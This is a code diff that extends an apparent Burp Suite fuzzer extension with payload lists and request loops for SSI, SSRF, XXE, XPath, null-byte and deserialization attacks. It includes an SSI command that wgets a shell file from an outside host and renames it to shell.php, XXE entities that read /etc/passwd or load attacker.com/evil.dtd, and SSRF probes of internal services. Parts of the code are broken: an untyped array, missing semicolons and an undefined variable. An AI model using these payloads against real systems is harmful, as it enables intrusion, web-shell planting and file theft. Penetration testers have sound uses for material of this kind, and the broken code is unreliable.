@@ -9,10 +9,24 @@
 // Delay variable, Adjust as per requirement - 1000 = 1 second delay
 int GLOBAL_DELAY_MS = 100; 
 
+// Burp Collborator host or any host name like example.com
+String hostname = "<BURPCOLLABORATOR>";
+
 // Different Payloads for Different Attack Types, Add more as per requirement
 String[] SPECIAL_CHARS = {
 	"!@#$%^&*()", "<>\"'", "[]{}|\\", "~`+=", ";:,./?"    
 };
+
+String[] SSI_PAYLOADS = {
+    "<!--#exec cmd=\"ls\" -->",
+    "<!--#exec cmd=\"cd /root/dir/\">",
+    "<!--#exec cmd=\"wget http://"+hostname+"/shell.txt | rename shell.txt shell.php\" -->",
+    "<!--#exec cmd=\"dir\" -->",
+    "<!--#exec cmd=\"cd C:\\admin\\dir\">",
+    "<!--#config errmsg=\"File not found, informs users and password\"-->",
+    "<!--#echo var=\"DOCUMENT_NAME\" -->",
+    "<!--#echo var=\"DOCUMENT_URI\" -->"
+}
 
 String[] XSS_PAYLOADS = {
 	"<script>alert('XSS')</script>",
@@ -23,6 +37,37 @@ String[] XSS_PAYLOADS = {
     "\"><script>alert('XSS')</script>",
     "<iframe src=javascript:alert('XSS')></iframe>"
 };
+
+SSRF_PAYLOADS = {
+    "http://127.0.0.1:80",
+    "http://127.0.0.1:22",
+    "http://127.0.0.1:3306",
+    "http://127.0.0.1:6379",
+    "http://127.0.0.1:9200",
+    "http://localhost:80",
+    "http://0.0.0.0:80",
+    "http://[::1]:80",
+    "http://10.0.0.1",
+    "http://192.168.1.1",
+    "http://172.16.0.1",
+    "https://127.0.0.1",
+    "ftp://127.0.0.1",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_INFO",
+    "dict://127.0.0.1:11211/stats",
+    "ldap://127.0.0.1:389",
+    "http://127.1",
+    "http://2130706433", // 127.0.0.1 in decimal
+    "http://0x7f000001", // 127.0.0.1 in hex
+    "http://127.000.000.1",
+    "http://" + hostname,
+    "https://" + hostname,
+    "http://127.0.0.1%2e80",
+    "http://127.0.0.1%252e80",
+    "http://127.0.0.1%25%32%65%38%30",
+    "http://[::ffff:127.0.0.1]",
+    "http://[0:0:0:0:0:ffff:127.0.0.1]"
+}
 
 String[] SQLI_PAYLOADS = {
     "' OR '1'='1",
@@ -58,6 +103,20 @@ String[] PATH_TRAVERSAL_PAYLOADS = {
     "/etc/passwd%00",
     "file:///etc/passwd",
     "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+};
+
+String[] NULLBYTE_PAYLOADS = {
+    "%00",
+    "\u0000",
+    "%2500",
+    "%00.php",
+    "%00admin",
+    "%c0%80",           // UTF-8 overlong encoding
+    "%e0%80%80",        // UTF-8 overlong encoding 3-byte
+    "\\x00",            // Literal backslash x00
+    "\\0",              // Literal backslash 0
+    "%00%00",           // Double null
+    "\0"                // Direct null character
 };
 
 // LDAP Injection
@@ -162,6 +221,29 @@ String[] BUSINESS_LOGIC_PAYLOADS = {
     "false",
     "null",
     "undefined"
+};
+
+String[] XXE_PAYLOADS = {
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
+    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/hosts\">]><data>&file;</data>",
+    "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>"
+};
+
+// Deserialization Attack Payloads
+String[] DESERIALIZATION_PAYLOADS = {
+    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4",
+    "O:8:\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}",
+    "{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\"}"
+};
+
+// XPATH Injection Payloads
+String[] XPATH_INJECTION_PAYLOADS = {
+    "' or '1'='1",
+    "x' or 1=1 or 'x'='y",
+    "'] | //user/*[contains(*,'pass')] | a['",
+    "' and count(//*)=1 and '1'='1",
+    "1/0"
 };
 
     
@@ -992,6 +1074,186 @@ for (burp.api.montoya.http.message.params.HttpParameter param: allParams) {
         }
     }
     
+    // -------------------------- Test 21: SSI PAYLOADS -------------------- //
+    logging.logToOutput("[ === Testing Unicode PAYLOADS === ] ");
+    for (String ssiPayload: SSI_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, ssiPayload, param.type()
+            )
+        );
+
+        try {
+            var response = api.http().sendRequest(modifiedRequest);
+            
+            // delay between requests
+            Thread.sleep(GLOBAL_DELAY_MS);
+         
+            int status = response.response().statusCode();
+            int responseLength = response.response().body().length();
+
+            String result = "SSI Payload: '" + ssiPayload + "'";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            // create request/response for organizer
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
+            // set annotations
+            requestResponseForOrganizer.annotations().setNotes(result);
+            // send to organizer
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("[ ======================================= ]");
+            logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
+            logging.logToError("[ ======================================= ]");
+            logging.logToError("Error with SSI Payload '" + ssiPayload + "': " + e.getStackTrace());
+        }
+    }
+
+        // -------------------------- Test 21: XXE Injection -------------------- //
+    logging.logToOutput("[ === Testing XXE PAYLOADS === ] ");
+    for (String xxePayload: XXE_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, xxePayload, param.type()
+            )
+        );
+
+        try {
+            var response = api.http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+         
+            int status = response.response().statusCode();
+            String result = "XXE Payload";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with XXE Payload: " + e.getStackTrace());
+        }
+    }
+
+        // -------------------------- Test 24: XPATH Injection -------------------- //
+    logging.logToOutput("[ === Testing XPATH Injection PAYLOADS === ] ");
+    for (String xpathPayload: XPATH_INJECTION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, xpathPayload, param.type()
+            )
+        );
+
+        try {
+            var response = api.http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+         
+            int status = response.response().statusCode();
+            String result = "XPATH Injection: '" + xpathPayload + "'";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with XPATH Injection: " + e.getStackTrace());
+        }
+    }
+
+    // -------------------------- Test 26: Deserialization Attack -------------------- //
+    logging.logToOutput("[ === Testing Deserialization PAYLOADS === ] ");
+    for (String deserPayload: DESERIALIZATION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, deserPayload, param.type()
+            )
+        );
+
+        try {
+            var response = api.http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+         
+            int status = response.response().statusCode();
+            String result = "Deserialization Attack";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with Deserialization: " + e.getStackTrace());
+        }
+    }
+
+    // -------------------------- Test 26: NULL BYTE Attack -------------------- //
+    logging.logToOutput("[ === Testing NULL BYTE PAYLOADS === ] ");
+    for (String nullPayload: NULLBYTE_PAYLOADS) {
+        String newValue = originalValue + nullPayload;
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, newPayload, param.type()
+            )
+        );
+
+        try {
+            var response = api.http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+         
+            int status = response.response().statusCode();
+            String result = "NULL BYTE Attack";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with NULL BYTE: " + nullPayload + e.getStackTrace());
+        }
+    }
+
+    // -------------------------- Test 27: SSRF Attack -------------------- //
+    logging.logToOutput("[ === Testing SSRF PAYLOADS === ] ");
+    for (String ssrfPayload: SSRF_PAYLOADS) {
+        //String newValue = originalValue + nullPayload;
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, ssrfPayload, param.type()
+            )
+        );
+
+        try {
+            var response = api.http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+         
+            int status = response.response().statusCode();
+            String result = "NULL BYTE Attack";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with SSRF Payload: " + ssrfPayload + e.getStackTrace());
+        }
+    }
+
 }
     
 // ------------------------------------------------------------ //
